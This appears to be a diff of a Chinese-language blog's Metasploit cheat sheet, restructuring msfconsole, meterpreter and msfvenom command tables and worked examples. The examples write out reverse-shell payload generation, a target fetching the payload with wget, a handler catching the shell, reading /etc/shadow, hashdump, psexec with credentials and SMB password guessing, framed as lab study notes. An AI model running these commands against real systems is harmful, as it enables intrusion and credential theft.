+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h3><table>
 <thead>
 <tr>
 <th>命令</th>
@@ -543,29 +530,29 @@
 <td><code>sudo -u postgres msfdb delete</code></td>
 <td>删除现有Metasploit数据库</td>
 </tr>
+<tr>
+<td><code>msfconsole</code></td>
+<td>主命令行界面</td>
+</tr>
 </tbody></table>
-<h3 id="msfconsole-命令"><a href="#msfconsole-命令" class="headerlink" title="msfconsole 命令"></a>msfconsole 命令</h3><table>
+<h3 id="msfconsole-基础命令"><a href="#msfconsole-基础命令" class="headerlink" title="msfconsole 基础命令"></a>msfconsole 基础命令</h3><table>
 <thead>
 <tr>
-<th>命令</th>
+<th>基础命令</th>
 <th>解释</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>msfconsole</code></td>
-<td>主命令行界面</td>
+<td><code>workspace</code></td>
+<td>显示所有工作区</td>
 </tr>
 <tr>
-<td><code>db_status</code></td>
-<td>启动并检查数据库状态</td>
+<td><code>workspace -a/-d &lt;WORKSPACE_NAME&gt;</code></td>
+<td>启动时位于默认工作区，-a 添加，-d 删除工作区</td>
 </tr>
 <tr>
 <td><code>workspace &lt;WORKSPACE_NAME&gt;</code></td>
 <td>切换工作区，以 * 开头为当前工作区，单独使用显示所有工作区</td>
-</tr>
-<tr>
-<td><code>workspace -a/-d &lt;WORKSPACE_NAME&gt;</code></td>
-<td>启动时位于默认工作区，-a 添加工作区，-d 删除工作区</td>
 </tr>
 <tr>
 <td><code>ls</code></td>
@@ -583,9 +570,19 @@
 <td><code>history</code></td>
 <td>查看之前输入的命令</td>
 </tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">workspace -a/-d &lt;WORKSPACE_NAME&gt;</span><br><span class="line">workspace -a hacker</span><br><span class="line"><span class="comment"># &lt;WORKSPACE_NAME&gt;: 取工作区名</span></span><br><span class="line"><span class="comment"># 新建名为 hacker 的工作区</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span> &lt;COMMAND&gt;</span><br><span class="line"><span class="built_in">help</span> <span class="built_in">set</span></span><br><span class="line"><span class="comment"># &lt;COMMAND&gt;: set, show...</span></span><br><span class="line"><span class="comment"># 查看 set 命令的帮助菜单</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="msfconsole-数据库命令"><a href="#msfconsole-数据库命令" class="headerlink" title="msfconsole 数据库命令"></a>msfconsole 数据库命令</h3><table>
+<thead>
 <tr>
-<td><code>payload</code></td>
-<td>与漏洞一起使用的有效载荷</td>
+<th>数据库命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>db_status</code></td>
+<td>启动并检查数据库状态</td>
 </tr>
 <tr>
 <td><code>db_nmap</code></td>
@@ -604,16 +601,26 @@
 <td>将数据库中此值添加到 rhosts 参数</td>
 </tr>
 <tr>
-<td><code>services -S</code></td>
+<td><code>services -S &lt;KEYWORDS&gt;</code></td>
 <td>搜索数据库中在环境中特定的服务</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">services -S &lt;KEYWORDS&gt;</span><br><span class="line">services -S netbios</span><br><span class="line"><span class="comment"># &lt;KEYWORDS&gt;: 搜索关键词</span></span><br><span class="line"><span class="comment"># 搜索数据库中在环境中 netbios 的服务</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="msfconsole-操作命令"><a href="#msfconsole-操作命令" class="headerlink" title="msfconsole 操作命令"></a>msfconsole 操作命令</h3><table>
+<thead>
+<tr>
+<th>操作命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>search type:&lt;MODULE_TYPE&gt; &lt;KEYWORDS&gt;</code></td>
+<td>搜索特定类型的模块</td>
 </tr>
 <tr>
 <td><code>search &lt;MODULE_PATH&gt;/&lt;KEYWORDS&gt;</code></td>
 <td>搜索与给定搜索参数相关的模块，使用 CVE 编号、漏洞名称或目标系统进行搜索</td>
-</tr>
-<tr>
-<td><code>search type:&lt;MODULE_TYPE&gt; &lt;KEYWORDS&gt;</code></td>
-<td>搜索特定类型的模块</td>
 </tr>
 <tr>
 <td><code>use &lt;MODULE_PATH&gt;/&lt;NUMBER&gt;</code></td>
@@ -622,6 +629,10 @@
 <tr>
 <td><code>info &lt;MODULE_PATH&gt;</code></td>
 <td>获取有关任何模块的更多信息，可在模块中直接使用</td>
+</tr>
+<tr>
+<td><code>show &lt;MODULE_TYPE&gt;</code></td>
+<td>列出可用模块类型</td>
 </tr>
 <tr>
 <td><code>show payloads</code></td>
@@ -634,10 +645,6 @@
 <tr>
 <td><code>show options</code></td>
 <td>列出所有可用的参数</td>
-</tr>
-<tr>
-<td><code>show &lt;MODULE_TYPE&gt;</code></td>
-<td>列出可用模块类型</td>
 </tr>
 <tr>
 <td><code>set &lt;PARAMETER_NAME&gt; &lt;VALUE&gt;</code></td>
@@ -676,8 +683,8 @@
 <td>启动漏洞模块，-z 参数会在会话建立后自动将其置于后台，不会进入交互模式</td>
 </tr>
 <tr>
-<td><code>session</code></td>
-<td>与目标系统建立的会话 ID</td>
+<td><code>sessions</code></td>
+<td>查看与目标系统建立的所有会话 ID</td>
 </tr>
 <tr>
 <td><code>back</code></td>
@@ -689,13 +696,17 @@
 </tr>
 <tr>
 <td><code>sessions -i &lt;NUMBER&gt;</code></td>
-<td>与指定编号的会话进行交互，使用前可通过 sessions 查看所有会话</td>
+<td>与指定编号的会话进行交互</td>
 </tr>
 <tr>
 <td><code>sessions -u &lt;NUMBER&gt;</code></td>
 <td>与指定编号的会话升级为 meterpreter</td>
 </tr>
 </tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search <span class="built_in">type</span>:&lt;MODULE_TYPE&gt; &lt;KEYWORDS&gt;</span><br><span class="line">search <span class="built_in">type</span>:auxiliary udp</span><br><span class="line"><span class="comment"># &lt;MODULE_TYPE&gt;: exploits, auxiliary, post, payloads, encoders, nops, evasion...</span></span><br><span class="line"><span class="comment"># &lt;KEYWORDS&gt;: udp, smb, tcp, NetBIOS...</span></span><br><span class="line"><span class="comment"># 将类型设置为辅助，搜索 udp 关键词</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search &lt;MODULE_PATH&gt;/&lt;KEYWORDS&gt;</span><br><span class="line">search auxiliary/scanner/smtp/smtp_relay</span><br><span class="line">search SMTP open relay</span><br><span class="line"><span class="comment"># &lt;MODULE_PATH&gt;: auxiliary/scanner/smtp/smtp_relay...</span></span><br><span class="line"><span class="comment"># &lt;KEYWORDS&gt;: udp, smb, tcp, NetBIOS...</span></span><br><span class="line"><span class="comment"># 搜索 auxiliary/scanner/smtp/smtp_relay 模块</span></span><br><span class="line"><span class="comment"># 搜索 SMTP open relay 关键词</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use &lt;MODULE_PATH&gt;/&lt;NUMBER&gt;</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">use 2</span><br><span class="line"><span class="comment"># &lt;MODULE_PATH&gt;: exploit/windows/smb/ms17_010_eternalblue...</span></span><br><span class="line"><span class="comment"># &lt;NUMBER&gt;: 0, 1, 2...</span></span><br><span class="line"><span class="comment"># 使用 exploit/windows/smb/ms17_010_eternalblue 模块，选择要使用的模块路径</span></span><br><span class="line"><span class="comment"># 使用搜索列出的第 2 个模块，选择要使用的模块对应数字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> &lt;PARAMETER_NAME&gt; &lt;VALUE&gt;</span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># &lt;PARAMETER_NAME&gt;: rhosts, lhost, rport, lport, session...</span></span><br><span class="line"><span class="comment"># &lt;VALUE&gt;: 192.0.2.1...</span></span><br><span class="line"><span class="comment"># 在该模块中设置目标系统的 IP 地址</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="meterpreter-命令"><a href="#meterpreter-命令" class="headerlink" title="meterpreter 命令"></a>meterpreter 命令</h3><table>
 <thead>
 <tr>
@@ -908,6 +919,9 @@
 <td>终止 Meterpreter 会话</td>
 </tr>
 </tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">migrate &lt;PID&gt;</span><br><span class="line">migrate 720</span><br><span class="line"><span class="comment"># &lt;PID&gt;: 1, 2, 3, 4...</span></span><br><span class="line"><span class="comment"># 将 Meterpreter 迁移到另一个 PID 为 720 的进程，但可能会丢失高权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">load &lt;Extensions&gt;</span><br><span class="line">load priv</span><br><span class="line"><span class="comment"># &lt;Extensions&gt;: python, priv...</span></span><br><span class="line"><span class="comment"># 把 priv 扩展加载进 Meterpreter，会多出一批与权限/提权相关的命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search -f &lt;FILE&gt;</span><br><span class="line">search -f file.txt</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: file.txt...</span></span><br><span class="line"><span class="comment"># 搜索目标系统中 file.txt 的所在位置</span></span><br></pre></td></tr></table></figure>
+
+
 <h3 id="msfvenom-命令"><a href="#msfvenom-命令" class="headerlink" title="msfvenom 命令"></a>msfvenom 命令</h3><table>
 <thead>
 <tr>
@@ -923,30 +937,29 @@
 <td><code>msfvenom --list formats</code></td>
 <td>列出可创建的多种格式</td>
 </tr>
+<tr>
+<td><code>msfvenom -p &lt;PAYLOAD_PATH&gt; LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f &lt;FILE_TYPE&gt; &gt; &lt;FILE&gt;</code></td>
+<td>列出可创建的多种格式</td>
+</tr>
 </tbody></table>
-<p>msfvenom -p <PAYLOAD_PATH> LHOST&#x3D;<IP> LPORT&#x3D;<PORT> -f <FILE_TYPE> &gt; <FILE></p>
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">help</span> &lt;COMMAND&gt;</span><br><span class="line"><span class="comment"># &lt;COMMAND&gt;: set，查看 set 命令的帮助菜单</span></span><br><span class="line"></span><br><span class="line">use &lt;MODULE_PATH&gt;/&lt;NUMBER&gt;</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">use 2</span><br><span class="line"><span class="comment"># &lt;MODULE_PATH&gt;: exploit/windows/smb/ms17_010_eternalblue，选择要使用的模块路径</span></span><br><span class="line"><span class="comment"># &lt;NUMBER&gt;: 0，选择要使用的模块对应数字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show &lt;MODULE_TYPE&gt; </span><br><span class="line">show payloads</span><br><span class="line"><span class="comment"># 在任何上下文中使用，后跟模块类型（辅助模块、有效载荷、漏洞利用等）列出可用模块</span></span><br><span class="line"><span class="comment"># &lt;MODULE_TYPE&gt;: exploits, auxiliary, post, payloads, encoders, nops, evasion...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search <span class="built_in">type</span>:&lt;MODULE_TYPE&gt; &lt;KEYWORDS&gt;</span><br><span class="line">search <span class="built_in">type</span>:auxiliary udp</span><br><span class="line"><span class="comment"># 将类型设置为辅助，搜索 udp 关键词</span></span><br><span class="line"><span class="comment"># &lt;MODULE_TYPE&gt;: auxiliary, payload...</span></span><br><span class="line"><span class="comment"># &lt;KEYWORDS&gt;: udp, smb, tcp, NetBIOS...</span></span><br><span class="line"></span><br><span class="line">search &lt;MODULE_PATH&gt;/&lt;KEYWORDS&gt;</span><br><span class="line">search auxiliary/scanner/smtp/smtp_relay</span><br><span class="line">search SMTP open relay</span><br><span class="line"><span class="comment"># &lt;MODULE_PATH&gt;: auxiliary/scanner/smtp/smtp_relay...</span></span><br><span class="line"><span class="comment"># &lt;KEYWORDS&gt;: udp, smb, tcp, NetBIOS...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> &lt;PARAMETER_NAME&gt; &lt;VALUE&gt;</span><br><span class="line"><span class="comment"># &lt;PARAMETER_NAME&gt;: rhosts，在该模块中设置目标系统的 IP 地址</span></span><br><span class="line"><span class="comment"># &lt;VALUE&gt;: 192.0.2.1</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search portscan</span><br><span class="line"><span class="comment"># 列出潜在的可用端口扫描模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="comment"># 并发：同时扫描的目标数量。</span></span><br><span class="line"><span class="comment"># PORTS：要扫描的端口范围。请注意，此处的 1-1000与使用默认配置的Nmap不同。Nmap将扫描最常用的 1000 个端口，而Metasploit将扫描 1 到 10000 之间的端口号。</span></span><br><span class="line"><span class="comment"># RHOSTS：要扫描的目标或目标网络。</span></span><br><span class="line"><span class="comment"># 线程数：同时使用的线程数。线程数越多，扫描速度越快。</span></span><br><span class="line"></span><br><span class="line">nmap -sS 192.0.2.1</span><br><span class="line"><span class="comment"># 可以直接在 msfconsole 里面执行 nmap 扫描</span></span><br><span class="line"></span><br><span class="line">search NetBIOS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/netbios/nbname</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">back</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p &lt;PAYLOAD_PATH&gt; LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f &lt;FILE_TYPE&gt; &gt; &lt;FILE&gt;</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=1234 -f elf &gt; rev_shell.elf</span><br><span class="line"><span class="comment"># &lt;PAYLOAD_PATH&gt;: linux/x86/meterpreter/reverse_tcp, windows/meterpreter/reverse_tcp...</span></span><br><span class="line"><span class="comment"># &lt;IP&gt;: 192.0.2.1...</span></span><br><span class="line"><span class="comment"># &lt;PORT&gt;: 80, 443...</span></span><br><span class="line"><span class="comment"># &lt;FILE_TYPE&gt;: elf, exe, php...</span></span><br><span class="line"><span class="comment"># &lt;FILE&gt;: file.elf</span></span><br><span class="line"><span class="comment"># 用 msfvenom 生成一个 Linux x86 的 ELF 格式的反向连接 Payload</span></span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">search http_version</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/http/http_version </span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost 10.10.7.211</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rport 8000</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search portscan</span><br><span class="line"><span class="comment"># 列出潜在的可用端口扫描模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/portscan/tcp 模块</span></span><br><span class="line"></span><br><span class="line">nmap -sS 192.0.2.1</span><br><span class="line"><span class="comment"># 可在 msfconsole 执行 nmap 扫描</span></span><br><span class="line"></span><br><span class="line">search NetBIOS</span><br><span class="line"><span class="comment"># 搜索关于 NetBIOS 的模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/netbios/nbname</span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/netbios/nbname 模块</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 显示选项设置</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">back</span><br><span class="line"><span class="comment"># 返回</span></span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">search smb_login</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.7.211</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbuser penny</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt </span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search http_version</span><br><span class="line"><span class="comment"># 搜索关于 http_version 模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/http/http_version </span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/http/http_version 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rport 8000</span><br><span class="line"><span class="comment"># 设置目标端口为 8000</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
 
 
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search smb_login</span><br><span class="line"><span class="comment"># 搜索关于 smb_login 模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/smb/smb_login 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbuser cypher</span><br><span class="line"><span class="comment"># 设置目标 smbuser 为 cypher</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt </span><br><span class="line"><span class="comment"># 设置密码字典路径为 /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt </span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.118.245 LPORT=1234 -f elf &gt; rev_shell_x64.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 -m http.server 9000 </span><br><span class="line"></span><br><span class="line">wget http://10.10.X.X:9000/rev_shell.elf</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x rev_shell.elf</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"></span><br><span class="line">ctrl+z</span><br><span class="line"></span><br><span class="line">use post/linux/gather/hashdump</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 2</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=1234 -f elf &gt; rev_shell.elf</span><br><span class="line"><span class="comment"># 用 msfvenom 生成一个 Linux 平台名为 rev_shell.elf 的反向连接 Payload, 本地IP 为 192.0.2.1，端口为 1234</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server 9000 </span><br><span class="line"><span class="comment"># 启动 python 简单服务器 9000 端口</span></span><br><span class="line"></span><br><span class="line">wget http://192.0.2.1:9000/rev_shell.elf</span><br><span class="line"><span class="comment"># 目标机器下载 rev_shell.elf</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x rev_shell.elf</span><br><span class="line"><span class="comment"># 目标机器赋予文件权限</span></span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="comment"># 使用 exploit/multi/handler 模块准备接收反向连接</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 设置和 msfvenom 生成的相同的 Payload</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost 192.0.2.1</span><br><span class="line"><span class="comment"># 设置本地 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport 1234</span><br><span class="line"><span class="comment"># 设置本地端口为 1234</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"><span class="comment"># 读取 /etc/shadow</span></span><br><span class="line"></span><br><span class="line">Ctrl + z</span><br><span class="line"><span class="comment"># 挂起，返回 msfconsole</span></span><br><span class="line"></span><br><span class="line">use post/linux/gather/hashdump</span><br><span class="line"><span class="comment"># 使用 post/linux/gather/hashdump 模块，读取 hash 密码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 2</span><br><span class="line"><span class="comment"># 设置 hashdump 要读取 hash 的 session</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbuser ballen</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbpass Password1</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line">Ctrl + z</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_shares</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">sessions -i 1</span><br><span class="line"></span><br><span class="line">getpid</span><br><span class="line"></span><br><span class="line">ps</span><br><span class="line"></span><br><span class="line">migrate 732</span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">search -f secret.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="comment"># 使用 exploit/windows/smb/psexec 模块</span></span><br><span class="line"></span><br><span class="line">show payloads</span><br><span class="line"><span class="comment"># 显示可用的 payloads</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 设置选择 payload</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 显示设置选项</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbuser cypher</span><br><span class="line"><span class="comment"># 设置目标 smbuser 为 cypher</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbpass passwd</span><br><span class="line"><span class="comment"># 设置目标 smbupass 为 passwd</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 显示设置选项再次检查</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">getuid</span><br><span class="line"><span class="comment"># 成功连接到 meterpreter，显示当前用户身份 </span></span><br><span class="line"></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 显示系统信息</span></span><br><span class="line"></span><br><span class="line">Ctrl + z</span><br><span class="line"><span class="comment"># 挂起，返回 msfconsole</span></span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_domain</span><br><span class="line"><span class="comment"># 使用 post/windows/gather/enum_domain 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="comment"># 设置使用该模块的 session</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_shares</span><br><span class="line"><span class="comment"># 使用 post/windows/gather/enum_shares 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="comment"># 设置使用该模块的 session</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">sessions -i 1</span><br><span class="line"><span class="comment"># 继续连接到 session 1，返回 meterpreter</span></span><br><span class="line"></span><br><span class="line">getpid</span><br><span class="line"><span class="comment"># 获取当前 meterpreter 的 PID</span></span><br><span class="line"></span><br><span class="line">ps</span><br><span class="line"><span class="comment"># 列出正在运行的进程</span></span><br><span class="line"></span><br><span class="line">migrate 732</span><br><span class="line"><span class="comment"># 迁移 meterpreter 到 PID 为 732 的程序，可伪装，可监听，稳定连接</span></span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line"><span class="comment"># 直接尝试获取 hash</span></span><br><span class="line"></span><br><span class="line">search -f file.txt</span><br><span class="line"><span class="comment"># 尝试搜索 file.txt 文件</span></span><br></pre></td></tr></table></figure>
 <br>]]></content>
       <categories>
         <category>工具</category>
@@ -966,13 +979,14 @@
       </categories>
   </entry>
   <entry>
-    <title>NVD</title>
-    <url>/2025/05/13/T-NVD/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="NVD"><a href="#NVD" class="headerlink" title="NVD"></a><a href="https://nvd.nist.gov/">NVD</a></h3><br>
+    <title>Microsoft Security Response Center</title>
+    <url>/2025/06/12/T-Microsoft-Security-Response-Center/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Microsoft-Security-Response-Center"><a href="#Microsoft-Security-Response-Center" class="headerlink" title="Microsoft Security Response Center"></a><a href="https://msrc.microsoft.com/update-guide/vulnerability">Microsoft Security Response Center</a></h3><h3 id="Microsoft®-更新目录"><a href="#Microsoft®-更新目录" class="headerlink" title="Microsoft® 更新目录"></a><a href="https://www.catalog.update.microsoft.com/Home.aspx">Microsoft® 更新目录</a></h3><br>
 
 
